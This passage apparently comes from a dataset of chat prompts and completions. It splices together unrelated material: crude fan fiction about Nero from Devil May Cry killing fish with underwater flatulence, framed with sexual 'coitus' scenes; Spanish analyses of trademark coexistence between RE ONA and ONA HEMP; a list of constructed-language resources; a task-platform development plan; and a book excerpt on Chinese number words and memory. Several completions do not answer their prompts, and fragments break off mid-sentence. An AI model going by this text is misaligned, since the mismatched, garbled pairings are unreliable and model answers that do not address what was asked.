reasons. With skills honed on the battlefield, Nero grilled his catch to perfection, their flesh flaking away with the touch of a fork, succulent and seasoned in reminiscence of his unconventional fishing technique. He plated his masterpiece with a flourish, pairing it with a glass of fine wine - the kind that might make Dante’s devilish debt collectors weep with envy. Reflecting on his day, Nero indulged in his gourmet dinner, content with the knowledge that even in the quiet moments of peace, he could still raise hell - or at least give the local fish population a good scare. And so concluded Nero’s naked nautical nuisance, a tale of fishing that would travel through the grapevine of Redgrave City, leaving the listeners aghast and a bit wary of their next seafood meal."},{"prompt":"What would Nero say about the favorite part of his fishing technique if I asked him about it in the middle of coitus?","completion":"Given the mature and sensitive nature of the situation you've described, let's imagine a scenario – one that stays within the bounds of good taste – where Nero might humorously reference his unorthodox fishing technique in a playful, innuendo-laden manner.

Nero, never one to pass up the opportunity for a cheeky jest, might catch his breath for a moment, giving his partner a devil-may-care grin before replying with a mischievous twinkle in his eye: \\"Ah, you know me—I'm all about causing a splash. I guess you could say my favorite part is the shockwave…it gets everything floatin' to the surface, ripe for the pickin'.\\" His reply would seamlessly blend the playful bravado he maintains as a Devil Hunter with the intimacy of the moment.

After a long day of slashing, bashing and, occasionally, clashtalking, he craved a meal that didn't come in a pizza box or a takeout bag. The city's markets were closed, demons still lurked, and Nero had an inkling for something fresh. Something primal. Something... piscatorial. Nero knew just the place: a serene pond on the outskirts of town, a place untouched by the city's chaos. And Nero, ever the unconventional soul, eschewed traditional rods and reels for a method as audacious as his fighting style; he called it \\"fart fishing.\\" So there he was, at the edge of the crystalline pond, illuminated by the copper light of dusk. Without a hint of trepidation, Nero disrobed in a swift, fluid motion that echoed his combat precision. The fabric fell from his body like petals from a wilting flower, revealing a physique carved from marble and countless battles. His butt, firm and honed from high-octane leaps and relentless lunges, complimented the powerful panorama of his sinewed back, tapered waist, and legs shaped by a life on the move. His snowy, swept-back hair, untouched by the pond's mist, framed a face of smirking intensity. Piercing blue eyes, often blazing with focus in the thickest of fights, now gazed over the still water with tranquil mischief. Nero stepped forward, his bare feet kissing the pond's edge before submerging into the cool embrace beneath. He waded further, the water lapping against his sinews like a lover's caress, until he was waist-deep. Then, with a devil-may-care grin splashed across his face, he took a deep breath, diving beneath the surface. In the water, his alabaster form glided, his movements as fluid as the element enveloping him. And then it happened. There, in the alien world beneath the pond's surface, Nero assumed the stance of a submerged satyr, cheeks puffed with purpose. With the precision of a maestro leading a demonic orchestra to its crescendo, he released. Bubbles emerged in a hilarious show, each a glossy orb racing for the ceiling of the pond. And within seconds, the lethal concoction of Nero's underwater warfare did its devastating work. Fish after fish fell prey to the incapacitating effects of the most unorthodox weapon in a devil hunter's arsenal, floating up to the surface in defeated flops. Nero emerged, like some fable Neptune arising from the depths, fish trailing in his victorious wake. He collected the vanquished sea-dwellers with boyish glee, bounding back to shore with the spoils of his cheeky conquest. Back home, the kitchen transformed into a stage for culinary combat. With the same finesse he applied to revving his Red Queen sword, Nero wielded knives and pans, searing and seasoning his catch into a gourmet delight that would've made any chef's heart sing with envy. Later that night, with bodies intertwined in the primal dance of coitus, you, unable to contain your curiosity amid the heights passion, whispered the question into Nero's ear: \\"What's your favorite part of the fart fishing technique?\\" He paused, the glint of the hunter flickering in his eyes, a smirk lifting the corner of his lips. \\"The surprise,\\" he breathed, voice thick with amusement. \\"You'd be amazed how often a good old-fashioned gas attack takes both demons and dinner off guard. It's the element you never see coming... or smelling.\\" The room filled with laughter, echoing into the night as two souls, entwined, found joy in the absurd, the dangerous, and the intimately ridiculous. And Nero's butt, that once armor-wrapped asset now bared to the elements, had proven to be the hero Red Grave never knew it needed."},{"prompt":"Describe land sea planet named Xyloci, it's ethereal and serene bluer world, atmosphere poop-smelly, ocean is dirtier of trashes.

Any fish that smells Nero’s underwater fart dies. he happily collects them. Back at home he cooks a gourmet dinner using the fish. Later, post-coitus, I ask him why he enjoys that fishing technique","completion":"Title: Nero's Noxious Nautical Nosh-Up The sun was setting on a picturesque demon-plagued world where our hero Nero, the demon hunter with a penchant for high-octane brawls and hair bluer than a sad smurf, decided to switch his Devil Bringer for something a little more domestic. With his sword Red Queen sheathed and his gun Blue Rose holstered, Nero was intent on procuring dinner for himself and his beloved in the most unconventional way imaginable. With the casual swagger only a half-demon could muster, he descended upon the nearest pond, which was clear as crystal and calm as the demeanor of a meditating monk. A pond that, unbeknownst to its aquatic residents, was about to become the stage of an epic and comedic fishing exploit. Now, Nero was never one to conform to societal norms, and his preferred method of fishing was as unorthodox as his combat style. Stripping down to absolutely nothing, he stepped into the cool embrace of the pond's waters, his pale buttocks gleamed under the moonlight like twin moons of their own, a sight his girlfriend struggled to look away from, the mixture of awe and suppressed laughter causing her abdominal muscles to ache. Ripples danced across the surface as he waded in, a stark contrast to the still-serene surroundings. His muscular form, toned from countless battles with Hell's finest, stood proud amidst the gentle sway of the pond's reeds. A mane of snowy hair cascading over his strong shoulders, Nero looked like a marble statue brought to mischievous life, the smug smirk playing on his face suggested he enjoyed every second of the absurdity. Positioning himself in the heart of the pond, he took a deep breath and exhaled what could only be described as an apocalyptic gust of wind from his derrière. The water bubbled and frothed like a witch's cauldron as the fish, struck by this unspeakable underwater weapon, floated lifelessly to the surface. With a triumphant holler and a grin as wide as the pond itself, Nero plucked the deceased fish from the water, his dinner obtained through the oddest of fishing methods. Drying off and once again donning his clothes, he returned home to showcase his culinary heroics. In the cozy confines of their abode, Nero demonstrated his versatility by transforming the ill-fated fish into a gourmet feast that would have made the gods themselves envious. The resulting meal was both sumptuous and fragrant, albeit with a questionable origin story. Later that evening, after a passionate display of love (undoubtedly a fiercer battle than any Nero had faced against the hordes of Hell), his girlfriend, nestled in the crook of his arm and surrounded by the tingling afterglow of their union, inquired why he held such a fondness for his unorthodox fishing technique. With the same half-cocked smirk that had decorated his visage earlier in the moonlit pond, Nero answered, \\"Because, love, life's too short for boring fish stories. Plus, it’s the thrill of the hunt—facing those gilled adversaries with nothing but the raw power of nature. In the end, it's not just about catching fish; it's about catching a good time.\\" His girlfriend shook her head, laughing at his ridiculous reasoning but appreciating the playful, carefree spirit that rested within the heart of her devil-may-care warrior. They fell asleep in each other’s arms, Nero's method for fishing archived in the annals of their adventures as their most absurdly amusing yet."},{"prompt":"Describe land sea planet named Xyloci, it's ethereal and serene bluer world, atmosphere poop-smelly, trashless ocean is clearly dirtier of trashes.

The still air was about to ripple with a blend of effrontery and humor, for Nero, the brash and blithe demon hunter known for his dazzling swordplay and cybernetic Devil Breaker arm, had shed the constraints of his usual combat attire for an au naturel approach to one of life's simpler pleasures—fishing. There stood Nero, in his birthday suit, his rear end competing with the sinking sun for the title of 'Most Glorious Sphere,' its sculpted form an ode to the countless battles and demon-slaying squats that honed his physique. His cerulean hair, often unkempt during the heat of combat, now licked his bare shoulders as the gentle breeze played with the silver strands. His striking, youthful face, occasionally marred by the ferocity of battle, exuded a serene innocence known only to those carefree souls daring enough to connect with nature in the raw. Armed only with his unique wit and unconventional methods, Nero waded into the pond, water embracing his form with an intimate chill. With the poise of an unlikely Adonis, he hunched over, his eyes gleaming with mischief as he prepared to deploy his wildly unorthodox fishing tactic. Pursed lips, a determined inhale, and then—a cathartic release. An undersea tremor rippled through the pond as the water bubbled with an almost musical symphony of flatulence. The aquatic inhabitants recoiled in shock as the olfactory assault blitzed their senses; it was as if a bubble-wrapped apocalypse announced its arrival with Nero's signature brand of humor. One by one, dazed fish floated to the surface, victims of an underwater sonic boom that left them ripe for the picking. Nero chuckled, his laughter echoing through the grove as he gathered the spoils of his efforts—a truly unique catch of the day. Back at their shared home, the demon hunter turned chef extraordinaire, transforming the flatulent-felled fish into a gourmet feast. The aromas of seasoned fillets and fresh herbs intermingled as the makeshift kitchen bore witness to Nero's culinary prowess. Laughter and the clinking of glasses filled the abode, the absurdity of the day's event fueling tales that grew wilder with each retelling. Later, as the moonlight cascaded through the bedroom window, casting a silver glow upon tangled sheets, Nero's boyfriend inquired, still chuckling from the residual humor of the event, \\"Why that method, of all things?\\" Nero, content and worn from the satisfaction of the day's endeavors—both culinary and carnal—flashed a devilish smirk. \\"Babe, it's all about masterful control and being one with the environment,\\" he said, the twinkle in his eye a match for the starlight above. \\"Plus, there's nothing like a good laugh to bring some extra flavor to the hunt. Makes the victory, and every moment after it, that much sweeter.\\" The night echoed once more with their laughter, Nero's unconventional fishing technique forever woven into the tapestry of memories that made their bond as thrilling and unpredictable as a Devil May Cry adventure."},{"prompt":"As a prompt generator for a generative AI called \\"Midjourney\\", you will create image prompts for the AI to visualize.

Here are some notable examples of constructed international auxiliary languages and resources you can explore: 1. **Esperanto**: This is the most successful constructed international auxiliary language so far, created by L. L. Zamenhof in 1887. Zamenhof's goal was precisely to foster better international understanding and communication. Resources: - [Esperanto.net](https://esperanto.net/) - [Lernu!](https://lernu.net/) is a multilingual site providing free learning materials and courses for Esperanto. 2. **Interlingua**: Developed by the International Auxiliary Language Association, Interlingua was created to be easily understandable by those who already know a Romance language. Resources: - [Interlingua.com](http://www.interlingua.com/) - [Union Mundial pro Interlingua](http://www.interlingua.com/an/) 3. **Volapük**: This was an earlier attempt at an international language created by Johann Martin Schleyer in 1879, which enjoyed some popularity before being largely superseded by Esperanto. Resources: - Various historical resources and texts in Volapük are available online. - [A Grammar of Volapük](https://archive.org/details/grammarofvolapuk00kertiala/page/n6/mode/2up) by Charles E. Sprague, available on Internet Archive. 4. **Ido**: This is a derivative of Esperanto, designed to address and fix what its creators saw as flaws in Esperanto. It was created in 1907. Resources: - [The Ido Foundation](http://www.idolinguo.org.uk/) - [Ido for all](https://www.ido.li/) 5. **Lingua Franca Nova (Elefen)**: A simple language based on Romance languages and created by Dr. C. George Boeree. Resources: - [Elefen.org](https://elefen.org/) 6. **Toki Pona**: This is a minimalistic language created by Sonja Lang in 2001, focused on expressing the maximum amount of meaning with minimal complexity.

Resources: - [ASD-STE100 Specification](https://www.asd-ste100.org/) Books on Constructed Languages: - \\"In the Land of Invented Languages\\" by Arika Okrent explores various constructed languages, including some designed to be international auxiliary languages. - \\"The Art of Language Invention\\" by David J. Peterson provides insights into the process of constructing languages, with a focus on those created for fictional worlds but still relevant for an IAL. Organizations and Communities: - The [Universal Esperanto Association (UEA)](https://www.uea.org/) is an international organization that promotes Esperanto. - [Constructed Language communities](https://conlang.org/) such as the Language Creation Society. Online Platforms and Tools: - Language learning platforms such as Duolingo, which offers courses on Esperanto and Klingon (another constructed language, though not designed as an IAL). - Online forums like Reddit's [r/conlangs](https://www.reddit.com/r/conlangs/), where you can find a community of language creators sharing their projects and offering advice. Remember that to create a successful IAL, it's not just about the linguistic design but also about cultural adoption and acceptance.

Amplitud de la Clase: Las clases de la Clasificación de Niza abarcan una amplia gama de productos o servicios, por lo que dos marcas pueden registrar productos o servicios diferentes dentro de la misma clase.2. Diferenciación Suficiente: Aunque las marcas tengan nombres similares, pueden tener suficiente diferenciación en términos de logotipos, gráficos o combinaciones de palabras que evitan confusión entre los consumidores.3. Evaluaciones Independientes: Las oficinas de marcas nacionales y regionales realizan sus propias evaluaciones, lo que puede llevar a la aprobación de solicitudes de marcas con nombres similares en países diferentes.4. Acuerdos de Consentimiento: En ocasiones, los titulares de marcas llegan a acuerdos que les permiten coexistir en el mercado, evitando así litigios.5. Uso y Reconocimiento: Marcas con nombres similares pueden ser usadas en contextos diferentes, teniendo mercados distintos o grupos de consumidores que no se solapan.6. Oposiciones y Disputas: Las marcas pueden enfrentar oposiciones durante el proceso de registro, y si no hay oposiciones o estas son superadas, pueden coexistir.En resumen, para registrar una marca en Colombia y a nivel internacional, es necesario considerar el registro local primero y luego expandirse utilizando herramientas como el Sistema de Madrid, siempre asegurándote de que tu marca cumple con la clasificación de Niza y se diferencia lo suficiente de las marcas existentes para evitar conflictos.

Al registrar una marca en la Superintendencia de Industria y Comercio (SIC) en Colombia, un negocio puede estar seguro de que sus productos o servicios tienen una salvaguarda legal. Por ejemplo, si un café colombiano llamado \\"Aroma Andino\\" busca proteger su nombre y logotipo, lo primero que hará es acudir a la SIC para realizar su registro, evitando que otras empresas utilicen una marca similar que pueda confundir a los consumidores. A nivel internacional, las empresas que deseen expandir su presencia pueden beneficiarse del Protocolo de Madrid, el cual permite la protección de una marca en múltiples países mediante una sola aplicación. Imaginemos que \\"Aroma Andino\\" desea exportar a Europa; utilizando este sistema, la marca podría solicitar protección en varios países de la Unión Europea a la vez, simplificando enormemente el proceso. La Clasificación de Niza organiza los bienes y servicios en 45 categorías distintas para facilitar este registro. En el caso de \\"Aroma Andino\\", se clasificaría dentro de la clase 30, que corresponde a café y asuntos relacionados, permitiendo así definir su nicho de mercado para protección legal. La posibilidad de que existan marcas similares dentro de una misma clase está presente. Como ejemplo, podríamos tener \\"Aroma Amazónico\\", también registrada en la clase 30, que podrá coexistir con \\"Aroma Andino\\" gracias a que sus presentaciones y ámbitos de mercado son distintos, evitando así la confusión del consumidor. Antes de registrar una marca, las empresas deben hacer una búsqueda detallada para verificar la disponibilidad del nombre que desean usar. Este paso es fundamental para evitar situaciones legales complicadas. Por ejemplo, si la marca de tecnología \\"SunTech\\" quiere ingresar al mercado colombiano, debe asegurarse de que no existe una \\"SunTek\\" en una clasificación relacionada que pudiera causar un conflicto. Crear una marca significativa y única es esencial para diferenciarse en el mercado y tener éxito en el proceso de registro. Supongamos que un nuevo servicio de mensajería móvil en Colombia elige el nombre \\"Mensajero Veloz\\", con un logotipo de un veloz jaguar; esta marca distintiva tendría mayores probabilidades de ser reconocida y recordada por los consumidores. Debido a la complejidad del proceso de registro de marcas, contar con la ayuda de un abogado especializado en propiedad intelectual es altamente recomendable. Su guía puede ser crítica; por ejemplo, si \\"Aroma Andino\\" enfrenta una disputa de marca, un abogado podría ayudarlos a negociar un acuerdo o a defender su caso en los tribunales. Para quienes buscan más información sobre el registro de marcas, recursos como la página web de la Superintendencia de Industria y Comercio de Colombia (www.sic.gov.co) y el sitio de la Organización Mundial de la Propiedad Intelectual (www.wipo.int) son de gran utilidad.

Para la protección internacional, el Protocolo de Madrid facilita la expansión de \\"Café de la Cima\\" en mercados extranjeros. Gracias a este protocolo, \\"Café de la Cima\\" puede solicitar protección de la marca en los países miembros con un solo trámite ante la OMPI, lo que simplifica y economiza el proceso de protección en diferentes territorios. Respecto a la clasificación de productos y servicios, la Clasificación de Niza permite que \\"Café de la Cima\\", que ofrece café colombiano, se registre en la clase 30. Esta estandarización ayuda a determinar con claridad la categoría en la cual se protegerá la marca. La coexistencia de marcas dentro de la misma clase de Niza es posible. Por ejemplo, \\"Panadería del Panal\\" podría coexistir con \\"Café de la Cima\\", ya que a pesar de estar ambas en la clase 30, la primera se enfoca en panes y la segunda en café, permitiendo una coexistencia sin confundir al consumidor. Para evitar conflictos, es esencial una búsqueda de marcas antes del registro. Si un diseñador gráfico lanza \\"Estudio Pixelar\\" y quiere asegurarse de que no hay marcas conflictivas, debe investigar el registro de \\"PixelArte\\" para confirmar que pueden coexistir legalmente. Crear una marca distintiva es vital, tal como \\"Zapatos Tropicales\\", con un llamativo logotipo de una palmera, lo que la hace fácilmente identificable y facilita su registro exitoso, además de construir un reconocimiento de marca en el público. Dado que el proceso de registro puede ser complicado, contar con un experto en propiedad intelectual es recomendable. Si \\"Zapatos Tropicales\\" enfrenta una disputa de marca, un abogado especializado podría ayudar a resolver el conflicto o proteger los intereses de la empresa en el juicio.

Ambas marcas operan en Francia, país signatario del Sistema de Madrid, lo que permite que las marcas internacionales obtengan protección de forma más eficiente. RE ONA se enfoca en una gama de ropa y calzado que incluye desde vestuario casual hasta trajes de negocios y trajes de baño. Su oferta incluye pantalones, jeans, camisas, blusas, faldas, entre otros. Por su parte, ONA HEMP también comercializa “vêtements” o prendas de vestir, con una lista especificada que incluye artículos como \\"chaussures de plage\\" y \\"chaussures de sport\\", es decir, calzado para la playa y deportivo. La coexistencia de estas dos marcas se podría sustentar no solo en la suficiente diferencia entre los nombres —a pesar de la similitud en la secuencia \\"ONA\\"— sino también en la naturaleza y el contexto del mercado de los productos. Por ejemplo, RE ONA enfatiza la ropa para uso diario y de negocios, mientras que ONA HEMP puede distinguirse por especializarse en productos confeccionados de cáñamo, lo que podría inferirse por su nombre, además de ofrecer una variedad que incluye vestimenta de playa y deportiva, pudiendo abarcar un nicho específico del mercado. En Francia, como en otros países, las evaluaciones de registro consideran tanto la similitud fonética y visual de las marcas como la posibilidad de confusión en el consumidor. Por lo tanto, si RE ONA y ONA HEMP fueron exitosamente registradas, implica que la autoridad competente en Francia, posiblemente la Institut National de la Propriété Industrielle (INPI), determinó que existían diferencias suficientes entre ambas para permitir su coexistencia en el mercado sin generar confusión. Además, si en algún momento se presentase un conflicto, ambas marcas podrían llegar a un acuerdo de coexistencia que defina claramente los términos y limitaciones de uso para cada una, posiblemente destacando que ONA HEMP se enfoca en productos de cáñamo y diferenciando aún más los segmentos de mercado que atienden. Incluso cuando la naturaleza de los productos es muy similar, la diferenciación puede darse a través de la estrategia de marca, el posicionamiento en el mercado y el enfoque de marketing, elementos que en conjunto configuran la identidad y la percepción de la marca en la mente del consumidor.

Por ejemplo, ONA HEMP podría enfocarse en un nicho ecológico o alternativo debido a la asociación con el cáñamo, un material sostenible. 3. **Identidad de Marca y Marketing**: RE ONA y ONA HEMP pueden emplear estrategias de branding y marketing diferenciadas que creen identidades de marca únicas y disminuyan la posibilidad de confusión entre los consumidores franceses. 4. **Acuerdos de Coexistencia**: Las dos compañías podrían negociar un acuerdo que defina claramente su coexistencia en el mercado, estableciendo límites en su comercialización y publicidad para evitar la confusión. 5. **Diferenciación Visual y Estilística**: La presentación visual de ambas marcas, incluidos logotipos, esquemas de color y estilos de diseño, puede contribuir a una mayor distinción que facilite la coexistencia sin confundir al consumidor. Si ambas marcas han sido exitosamente registradas en Francia, se puede asumir que la autoridad de marcas francesa ha realizado una evaluación de las similitudes y ha concluido que no hay riesgo relevante de confusión para el consumidor.

Nero, eyes twinkling with devilish mirth, donned not but his confidence and a determined grin. He strode into the secluded pond, his bare physique a testament to both his relentless battles and his love for pizza on cheat days. The water embraced him like a long-lost lover, welcoming his sculpture of a body, which might have been carved by the angels had they not feared its perfection would inspire too much envy. His posterior, shapely and firm, glinted under the moon's coy kiss, a sight that would bewitch any creature of the night and make the fish within blanch with inadequacy. His thickly bundled hair, normally kept in impeccable style even amid ferocious battle, now cascaded in wild abandon down his back, an untamed waterfall of what looked like celestial threads. His face, a canvas of concentration and eagerness, contorted into a sly smirk. Nero, ever the unconventional soul in both battle and leisure, had developed a fishing technique matched by none. With a giggle that echoed off the lily pads, Nero waded into the pond's deeper embrace, his manly bubbles surfacing with naught but innocent intent. He then proceeded to ready himself for the unique act of olfactory onslaught — his patented booty blast fishing maneuver. And then, the moment of aromatic release arrived. Nero let out an underwater thunderclap, a bubbly cacophony that rattled through the water with such resonance that the tales of its power would ripple through the ranks of marine life for eons. The lethal legume breeze he released so cavalierly wrought devastation upon the unsuspecting ichthyoids. They floated to the surface, victims of his vengeful veggie vengeance. Nero, elated with his bountiful harvest, scooped up the fish with an enthusiastic cheer. His laughter mingled with the night sounds, a joyful tune to accompany such a peculiar procurement. Triumphant, he returned home, his booty bounty in tow. In the comfort of their cozy abode, Nero transformed into a chef extraordinaire. He laid the fish upon the counter with tender care, serenading them with sweet nothings of oils and herbs, promising a finale in which their sacrifice for sustenance would be honored in gastronomic revelry. The kitchen filled with the mouthwatering aroma of spices and sauté, the fish gracing their plates with a final dash of dignity and deliciousness. Later, in the afterglow of their heavenly union, they reclined, bodies intertwined, as the embers of the once-roaring fire settled into a warm, comforting glow. With a voice softened by contentment, Nero's lover inquired amidst a shared chuckle, \\"Love, what joy do you find in such an... unorthodox fishing technique?\\" Nero, with a twinkle in his eyes that could outshine the morning star, replied, \\"In the heat of battle, it's all swordplay and quick reflexes. But in the tranquil lap of nature, it's just you and the water, and the simple pleasure of being who you are. This method, my darling, frees me. It reminds me that in a world teeming with darkness, there's still room for laughter, lightness, and love.\\" And so, beneath a blanket of stars unfazed by the odd tales of mortal men, Nero and his paramour shared secrets and smiles, their bond strengthened by a shared sense of humor and the quirky charms of their peculiar fish tale."},{"prompt":"In the context of a hypothetical adapt the sitcom Ghosts for a Dutch, French or Spanish Audience ?

RE ONA se especializa en una línea de ropa y calzado que abarca desde prendas casuales y de negocios hasta moda para estar en casa y ropa de baño. Su portafolio de productos incluye pantalones, jeans, camisas, camisetas, blusas y calzado para situaciones cotidianas y eventos nocturnos. ONA HEMP, en cambio, también en la Clase 25, ofrece productos que incluyen no solo ropa y calzado de uso general, sino también elementos específicos como ropa de cuero, prendas de piel y una variedad de calzado para diferentes actividades, incluidas chaussures de plage (zapatos de playa) y chaussures de ski (zapatos de esquí). Ambas marcas, aunque nominalmente similares y con una gama de productos que se superponen, pueden distinguirse a través de los siguientes factores: 1. Foco de Productos: RE ONA podría centrarse en satisfacer la demanda de ropa y calzado para entornos urbanos y negocios, mientras que ONA HEMP podría destacarse por su oferta más especializada y la inclusión de artículos como ropa de cuero y calzado para actividades específicas. 2. Segmentación del Mercado: Aunque las dos marcas venden productos similares, es posible que se dirijan a segmentos de mercado diferentes. Por ejemplo, ONA HEMP podría enfocarse en un nicho ecológico o alternativo debido a la asociación con el cáñamo, un material sostenible. 3. Identidad de Marca y Marketing: RE ONA y ONA HEMP pueden emplear estrategias de branding y marketing diferenciadas que creen identidades de marca únicas y disminuyan la posibilidad de confusión entre los consumidores franceses. 4. Acuerdos de Coexistencia: Las dos compañías podrían negociar un acuerdo que defina claramente su coexistencia en el mercado, estableciendo límites en su comercialización y publicidad para evitar la confusión. 5. Diferenciación Visual y Estilística: La presentación visual de ambas marcas, incluidos logotipos, esquemas de color y estilos de diseño, puede contribuir a una mayor distinción que facilite la coexistencia sin confundir al consumidor. Si ambas marcas han sido exitosamente registradas en Francia, se puede asumir que la autoridad de marcas francesa ha realizado una evaluación de las similitudes y ha concluido que no hay riesgo relevante de confusión para el consumidor. Además del examen inicial, la falta de oposición por parte de terceros interesados también puede indicar que la coexistencia es práctica y razonable. En el escenario hipotético que nos ocupan, RE ONA y ONA HEMP coexisten pacíficamente en el mercado francés, cada una con su propio espacio y estrategia de marca claramente definida.] Texto 2: [ Coexistencia de marcas similares en Francia: Ejemplo **Marcas:** * **RE ONA** (Clase Niza 25): Ropa informal, ropa de negocios, ropa de estar por casa, trajes de baño, prendas de vestir (pantalones, vaqueros, camisas, camisetas, blusas, faldas, pantalones cortos, vestidos, bufandas, cinturones, calcetines, ropa interior, prendas de abrigo, chaquetas, blazers), calzado informal y calzado de noche. * **ONA HEMP** (Clase Niza 25): Ropa, calzado, sombrerería, camisas, ropa de cuero, cinturones (ropa), pieles (ropa), guantes (ropa), bufandas, corbatas, calcetería, calcetines, pantuflas, zapatos de playa, botas de esquí, calzado deportivo, ropa interior. **Análisis:** 1. **Similaridad de nombres:** * **Similitudes:** Ambas marcas contienen la palabra \\"ONA\\". * **Diferencias:** \\"RE ONA\\" tiene dos palabras, mientras que \\"ONA HEMP\\" tiene una sola palabra y además incluye \\"HEMP\\". 2. **Productos:** * **Similitudes:** Ambas marcas se registran en la misma clase Niza (25) y comercializan productos similares, como ropa, calzado y accesorios. * **Diferencias:** * \\"RE ONA\\" especifica algunos tipos de ropa (pantalones, vaqueros, etc.) mientras que \\"ONA HEMP\\" solo menciona \\"ropa\\" en general. * \\"ONA HEMP\\" incluye productos adicionales como sombrerería, pieles, corbatas, pantuflas, zapatos de playa y botas de esquí que no se encuentran en \\"RE ONA\\". 3. **Territorio:** * Ambas marcas se registrarían en Francia. **Conclusión:** En este caso, la coexistencia de las dos marcas en Francia es posible debido a las siguientes razones: * **Diferencias en los nombres:** La adición de \\"HEMP\\" y la diferencia en la cantidad de palabras crean una distinción suficiente entre las marcas. * **Diferencias en los productos:** Aunque hay una superposición significativa en los productos, \\"ONA HEMP\\" ofrece algunos productos adicionales que no se encuentran en \\"RE ONA\\". * **Territorio:** El registro se limita a Francia, lo que reduce la posibilidad de confusión entre los consumidores. **Factores adicionales a considerar:** * **Prestigio de las marcas:** Si una de las marcas es ampliamente conocida, podría tener mayor protección y generar mayor riesgo de confusión. * **Canales de distribución:** Si las marcas se venden en diferentes canales o se dirigen a diferentes segmentos de mercado, la probabilidad de confusión se reduce. * **Acuerdos de coexistencia:** Los propietarios de las marcas podrían llegar a un acuerdo para permitir la coexistencia de las marcas en el mercado. **Recomendación:** Se recomienda realizar un análisis más exhaustivo que incluya una búsqueda de marcas en Francia para determinar si existen marcas similares ya registradas. También es recomendable consultar con un abogado especializado en propiedad intelectual para obtener asesoramiento legal sobre las posibilidades de éxito en el registro de la marca y la viabilidad de su coexistencia con otras marcas en el mercado francés. **Recursos adicionales:** * Sitio web de la Oficina Francesa de Patentes y Marcas: [https://www.inpi.fr/fr](https://www.inpi.fr/fr) * Guía de la OMPI sobre el registro de marcas: [se quitó una URL no válida]] Une los dos textos en uno, sin dejar ninguna idea por fuera en tu nuevo texto, piensatelo dos veces antes de redactarlo.","completion":"Coexistencia de Marcas Similares en Francia: Análisis de RE ONA y ONA HEMP En Francia, la coexistencia pacífica de marcas similares, aunque compitan bajo la misma Clase 25 de la Clasificación de Niza, es un fenómeno factible y regulado.

Here’s a step-by-step blueprint to help you get started: 1. **Requirement Analysis and Stakeholder Interviews:** - Meet with representatives of both user types (company employees and customers) to gather detailed requirements. - Understand their needs, pain points, and the desired outcome of the task flow. 2. **Process Mapping:** - Map out the entire flow of tasks, including all potential actions like approve, deny, select, and verify. - Clearly define which party can perform which actions and under what conditions. 3. **Flowchart or Wireframe Creation:** - Use a tool like Lucidchart, Draw.io or Balsamiq to create flowcharts or wireframes that visually represent the task flow you've mapped out, including all decision points. 4. **Prototyping:** - Using a tool like Adobe XD, Figma, or Sketch, create a high-fidelity prototype of the platform. - Include UI components for task creation, assignment, approval mechanisms, verification, etc. 5. **User Stories and Use Cases:** - Develop user stories that capture the requirements from the perspective of the end users to guide your development process. 6. **Platform Development:** - Choose a technology stack that is secure, scalable, and has a good support community (e.g., MEAN/MERN stack, .NET, Ruby on Rails). - Develop APIs for backend/front-end communication, especially focusing on authenticating users and handling permissions. 7. **Security:** - Implement robust authentication and authorization mechanisms to safeguard against unauthorized access. - Make sure to have secure, role-based access control. Employees and customers should have different permissions and visibility within the platform. 8. **Feedback Loop:** - Include feedback mechanisms at every step to ensure the tasks are communicated clearly and actioned upon promptly. - Build in notifications and reminders to ensure tasks do not go unnoticed. 9. **Testing:** - Extensively test the platform with units, integration, and user acceptance testing to ensure reliability and security. 10. **Pilot Launch:** - Launch the platform to a small group of users for beta testing. - Collect feedback and polish the UX/UI as needed. 11. **Training and Documentation:** - Train users on both sides to effectively use the platform. - Provide thorough documentation to aid understanding. 12. **Full-scale Launch and Support:** - Once testing is complete and all stakeholders are satisfied, launch the platform to the wider audience. - Offer ongoing support to quickly resolve any issues that may arise. Throughout this process, ensure that there's a strong focus on user experience to create an intuitive platform where tasks and communication flow seamlessly. Consult with legal teams if necessary to ensure all data handling complies with relevant privacy laws, particularly if personal customer data is involved.

For instance, making sure the \\"Complete Task\\" button stands out and perhaps changes color when a user hovers it to indicate it's the primary action. Finally, implementing this with good practices would involve using JavaScript to handle the interactivity—such as updating the task's status, posting a comment, uploading attachments, and handling the completion action—and Ajax for real-time updates without reloading the entire page."},{"prompt":"what should I search on google to get examples of something like this","completion":"To get examples of UI components for task completion in a user interface, you can use the following search phrases on Google: 1. \\"task management card UI design\\" 2. \\"task completion interface examples\\" 3. \\"UI design for user task modules\\" 4. \\"interactive task card UI components\\" 5. \\"task workflow UI design inspiration\\" 6. \\"user interface task completion buttons\\" 7. \\"to-do list UI design examples\\" 8. \\"project management task card UX\\" 9. \\"UI patterns for task management\\" 10. \\"task card design in web applications\\" 11. \\"dashboard UI task module examples\\" 12. \\"UI examples of task actions in management systems\\" 13. \\"task card component design for web\\" 14. \\"UI/UX design task management actions\\" 15. \\"user task interaction interface samples\\" Remember to review various design showcases and platforms where designers share their UI/UX projects, such as: - Dribbble - Behance - Awwwards - Pinterest (searching for UI/UX design boards) - UI Movement - Pttrns On these platforms, you can find real-world examples, concepts, and high-fidelity mockups created by professionals.

Read them out loud. Now look away and spend twenty seconds memorizing that sequence before say- ing them out loud again. SHAPING ARGUMENT 117 If you speak English, you have about a 50 percent chance of remembering that sequence perfectly. If you’re Chinese, though, you’re almost certain to get it right every time. Why is that? Because as human beings we store digits in a memory loop that runs for about two seconds. We most easily memorize whatever we can say or read within that two-second span. And Chinese speakers get that list of numbers — 4, 8, 5, 3, 9, 7, 6 — right almost every time because, unlike English, their language allows them to fit all those seven numbers into two seconds. That example comes from Stanislas Dehaene’s book The Number Sense. As Dehaene explains: Chinese number words are remarkably brief. Most of them can be uttered in less than one-quarter of a second (for instance, 4 is “si” and 7 “qi”). Their English equivalents — “four,” “seven,” — are longer: pronouncing them takes about one-third of a second. The memory gap between English and Chinese apparently is entirely due to this difference in length. In languages as diverse as Welsh, Arabic, Chinese, English and Hebrew, there is a reproducible cor- relation between the time required to pronounce numbers in a given language and the memory span of its speakers. In this domain, the prize for efficacy goes to the Cantonese dialect of Chinese, whose brevity grants residents of Hong Kong a rocketing memory span of about 10 digits. It turns out that there is also a big difference in how number-naming systems in Western and Asian languages are constructed. In English, we say fourteen, sixteen, seventeen, eighteen, and nineteen, so one might expect that we would also say oneteen, twoteen, threeteen, and fiveteen. But we don’t. We use a different form: eleven, twelve, thirteen, and fifteen. Similarly, we have forty and sixty, which sound like the words they are related to (four and six). But we also say fifty and thirty and twenty, which sort of sound like five and three and two, but not really. And, for that matter, for numbers above twenty, we put the “decade” first and the unit num- ber second (twenty-one, twenty-two), whereas for the teens, we do it the other way around (fourteen, seventeen, eighteen). The number system in English is highly irregular. Not so in China, Japan, and Korea. They have a logical counting system. Eleven is 